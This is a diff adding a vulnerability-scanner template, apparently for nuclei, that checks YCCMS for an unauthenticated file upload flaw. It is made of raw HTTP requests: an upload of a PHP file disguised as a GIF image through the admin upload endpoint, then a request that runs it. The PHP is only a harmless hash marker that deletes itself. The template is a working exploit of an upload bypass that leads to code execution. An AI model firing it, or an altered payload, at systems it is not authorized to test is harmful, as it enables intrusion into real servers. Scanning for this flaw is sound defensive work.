@@ -1,0 +1,48 @@
+id: yccms_Unauthorized_file_Upload
+
+info:
+  name: yccms_Unauthorized_file_Upload
+  author: xiaohe
+  severity: high
+  description: description
+  reference:
+    - https://xz.aliyun.com/t/7748
+  tags: yccms
+
+requests:
+  - raw:
+      - |
+        POST /admin/?a=call&m=upLoad HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
+        Content-Type: multipart/form-data; boundary=---------------------------1738641308287453414072243889
+        Content-Length: 382
+        Origin: http://xiaoheycc:81
+        Connection: close
+
+        -----------------------------1738641308287453414072243889
+        Content-Disposition: form-data; name="pic"; filename="test.php"
+        Content-Type: image/png
+
+        GIF89a
+        <?php echo md5("99838473");unlink(__FILE__);?>
+        -----------------------------1738641308287453414072243889
+        Content-Disposition: form-data; name="send"
+
+        确定上传
+        -----------------------------1738641308287453414072243889--
+
+      - |
+        GET /view/index/images/logo.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200"
+          - "status_code_2 == 200"
+          - "contains(body_1, 'view/index/images/logo.php')"
+          - "contains(body_2, 'e1253dfadc2f98b3d890894c7d291ef7')"
+        condition: and
